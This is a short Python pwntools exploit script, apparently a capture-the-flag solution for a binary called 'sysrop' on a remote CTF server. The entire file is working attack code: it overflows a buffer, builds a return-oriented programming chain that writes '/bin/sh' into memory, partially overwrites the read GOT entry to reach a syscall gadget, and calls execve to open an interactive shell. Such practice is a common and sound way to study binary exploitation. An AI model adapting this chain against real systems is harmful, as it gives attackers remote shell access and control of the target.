#!/usr/bin/python 
from pwn import * 

#p = process("./sysrop") 
p = remote("ctf.j0n9hyun.xyz", 3024) 
elf =ELF("./sysrop") 
#libc = ELF("./libc.so.6") 
#libc = ELF("/lib/x86_64-linux-gnu/libc.so.6") 
data = 0x601030 
p1ret = 0x004006ed # pop rsi; ret 
p3ret = 0x004005eb # pop rdx; pop rdi; pop rsi; ret 
p4ret = 0x4005ea #pop rax; pop rdx; pop rdi; pop rsi; ret 
read_plt = elf.plt['read'] 
read_got = elf.got['read'] 
binsh = "/bin/sh\x00" 
main = 0x4005f2 

pay = 'A'*0x10 + 'B'*0x8 
pay += p64(p3ret) + p64(len(binsh)) + p64(0) + p64(data) + p64(read_plt) 
pay += p64(main) 

p.sendline(pay) 
sleep(0.1) 
p.send(binsh) 
sleep(0.1) 

pay = 'A'*0x10 + 'B'*0x8 
pay += p64(p3ret) + p64(1) + p64(0) + p64(read_got) + p64(read_plt) 
pay += p64(p4ret) + p64(59) + p64(0) + p64(data) + p64(0) + p64(read_plt) 
# syscall_id - 59 : execve 
# execve("/bin/sh", NULL, NULL) 

p.sendline(pay) 
sleep(0.1) 
p.sendline("\x5e") 
sleep(0.1) 

p.interactive()

